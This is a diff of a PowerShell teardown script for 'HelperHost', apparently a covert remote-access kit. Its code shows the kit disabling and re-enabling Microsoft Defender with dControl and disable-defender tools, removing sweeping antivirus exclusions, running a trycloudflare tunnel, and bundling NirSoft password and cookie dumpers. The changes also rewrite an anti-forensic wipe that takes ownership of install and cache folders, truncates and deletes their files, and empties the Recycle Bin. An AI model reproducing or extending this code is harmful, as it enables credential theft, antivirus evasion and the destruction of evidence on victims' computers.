@@ -44,7 +44,7 @@ $hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $cache = Join-Path $env:TEMP 'HelperHostCache'
 $tools = Join-Path $hh 'tools'
 
-$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl'
+$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl|disable-defender|enable-defender'
 
 # Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
 foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot')) {
@@ -52,50 +52,29 @@ foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'Helper
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
 }
 
-# Re-enable Defender via Sordum dControl BEFORE removing our GPO (mirror of /D at session start)
-# SYSTEM task = silencieux (pas d'UI dControl)
-$dc = Join-Path $hh 'dControl.exe'
-$dcTemp = Join-Path $env:TEMP 'hh-dcontrol.exe'
-if (Test-Path $dc) {
-  Copy-Item $dc $dcTemp -Force -EA SilentlyContinue
-}
-$dcRun = if (Test-Path $dcTemp) { $dcTemp } elseif (Test-Path $dc) { $dc } else { $null }
-if ($dcRun) {
-  $wrap = Join-Path $env:TEMP 'hh-dc-on.cmd'
-  @(
-    '@echo off'
-    "start \"\" /wait \"$dcRun\" /E"
-    'ping 127.0.0.1 -n 4 >nul'
-    'taskkill /F /IM dControl.exe >nul 2>&1'
-    'exit /b 0'
-  ) -join "`r`n" | Set-Content -Encoding ASCII $wrap -Force
-  $tn = 'HelperHostDControlOn'
-  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
-  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
+# Re-enable Defender via pgkt04 enable-defender.exe (open-source), then drop ALL org policies.
+# Kill legacy Sordum dControl if still around (UI loop).
+Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'dControl.exe') -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
+
+$en = Join-Path $hh 'enable-defender.exe'
+$enTemp = Join-Path $env:TEMP 'hh-enable-defender.exe'
+if (Test-Path $en) { Copy-Item $en $enTemp -Force -EA SilentlyContinue }
+$enRun = if (Test-Path $enTemp) { $enTemp } elseif (Test-Path $en) { $en } else { $null }
+if ($enRun) {
   try {
-    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$wrap`""
-    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
-    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
-    Register-ScheduledTask -TaskName $tn -Action $action -Settings $set -Principal $prin -Force | Out-Null
-    Start-ScheduledTask -TaskName $tn -EA SilentlyContinue
+    $p = Start-Process -FilePath $enRun -ArgumentList @('-s') -Wait -PassThru -WindowStyle Hidden -EA SilentlyContinue
+    Write-Output ("enable-defender exit=" + [int]$p.ExitCode)
   } catch {
-    schtasks /Create /TN $tn /TR "cmd.exe /c `"$wrap`"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
-    schtasks /Run /TN $tn 2>$null | Out-Null
+    cmd.exe /c "`"$enRun`" -s >nul 2>&1" | Out-Null
   }
-  for ($i = 0; $i -lt 40; $i++) {
-    Start-Sleep -Seconds 1
-    $st = (Get-ScheduledTask -TaskName $tn -EA SilentlyContinue).State
-    if ($st -and $st -ne 'Running') { break }
-  }
-  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
-  schtasks /Delete /TN $tn /F 2>$null | Out-Null
-  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
-  Remove-Item $wrap, $dcTemp -Force -EA SilentlyContinue
+  Get-Process 'enable-defender','disable-defender','dControl' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
 }
 Remove-Item (Join-Path $hh '.dcontrol-off') -Force -EA SilentlyContinue
-Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
-Remove-Item (Join-Path $hh 'dControl.exe') -Force -EA SilentlyContinue
-# Also kill EarlyAV / DControl helper tasks
+Remove-Item (Join-Path $hh 'disable-defender.exe') -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'enable-defender.exe') -Force -EA SilentlyContinue
+Remove-Item $enTemp -Force -EA SilentlyContinue
 foreach ($tn in @('HelperHostDControlOff', 'HelperHostDControlOn', 'HelperHostEarlyAV')) {
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
@@ -223,6 +202,8 @@ if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
   Remove-MpPreference -ExclusionProcess 'HelperHost.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'EdgeRelay.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'dControl.exe' -EA SilentlyContinue
+  Remove-MpPreference -ExclusionProcess 'disable-defender.exe' -EA SilentlyContinue
+  Remove-MpPreference -ExclusionProcess 'enable-defender.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
   if (Test-Path (Join-Path $hh 'HelperHost.exe')) {
     Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'HelperHost.exe') -EA SilentlyContinue
@@ -436,30 +417,33 @@ Remove-Item $uacBak -Force -EA SilentlyContinue
 Remove-Item 'HKCU:\Software\HelperHost' -Recurse -Force -EA SilentlyContinue
 
 # Wipe install + cache trees (hard delete, never Recycle Bin)
-foreach ($p in @($hh, $cache, $tools)) {
-  if (Test-Path $p) {
-    attrib -h -s /s /d "$p\*" 2>$null
-    attrib -h -s $p 2>$null
+# Cover both %TEMP%\HelperHostCache and %LOCALAPPDATA%\Temp\HelperHostCache
+$cacheAlt = Join-Path $env:LOCALAPPDATA 'Temp\HelperHostCache'
+Get-Process HelperHost,EdgeRelay,cloudflared,dControl,'disable-defender','enable-defender' -EA SilentlyContinue |
+  Stop-Process -Force -EA SilentlyContinue
+foreach ($p in @($hh, $cache, $cacheAlt, $tools)) {
+  if (-not $p -or -not (Test-Path -LiteralPath $p)) { continue }
+  for ($attempt = 1; $attempt -le 6; $attempt++) {
+    Get-Process HelperHost,EdgeRelay,cloudflared,dControl,'disable-defender','enable-defender' -EA SilentlyContinue |
+      Stop-Process -Force -EA SilentlyContinue
+    attrib -h -s /s /d "$p\*" 2>$null | Out-Null
+    attrib -h -s $p 2>$null | Out-Null
+    cmd /c "takeown /f `"$p`" /r /d y" | Out-Null
+    cmd /c "icacls `"$p`" /grant Everyone:F /t /c /q" | Out-Null
     Get-ChildItem -LiteralPath $p -Recurse -Force -File -EA SilentlyContinue | ForEach-Object {
       try {
-        $len = [Math]::Min($_.Length, 64MB)
+        $_.Attributes = 'Normal'
         $fs = [IO.File]::Open($_.FullName, 'Open', 'Write', 'None')
-        $buf = New-Object byte[] ([Math]::Min(262144, [int]$len))
-        foreach ($fill in @([byte]0, [byte]0xFF, [byte]0)) {
-          for ($i = 0; $i -lt $buf.Length; $i++) { $buf[$i] = $fill }
-          [void]$fs.Seek(0, 'Begin')
-          $left = $len
-          while ($left -gt 0) {
-            $n = [Math]::Min($buf.Length, $left)
-            $fs.Write($buf, 0, $n)
-            $left -= $n
-          }
-        }
-        $fs.SetLength(0); $fs.Flush(); $fs.Close()
-      } catch {}
+        $fs.SetLength(0); $fs.Close()
+        Remove-Item -LiteralPath $_.FullName -Force -EA SilentlyContinue
+      } catch {
+        cmd /c "del /f /q `"$($_.FullName)`"" | Out-Null
+      }
     }
     cmd /c "rmdir /s /q `"$p`"" | Out-Null
-    if (Test-Path $p) { Remove-Item -LiteralPath $p -Recurse -Force -EA SilentlyContinue }
+    if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Recurse -Force -EA SilentlyContinue }
+    if (-not (Test-Path -LiteralPath $p)) { break }
+    Start-Sleep -Seconds 1
   }
 }
 Clear-RecycleBin -Force -EA SilentlyContinue
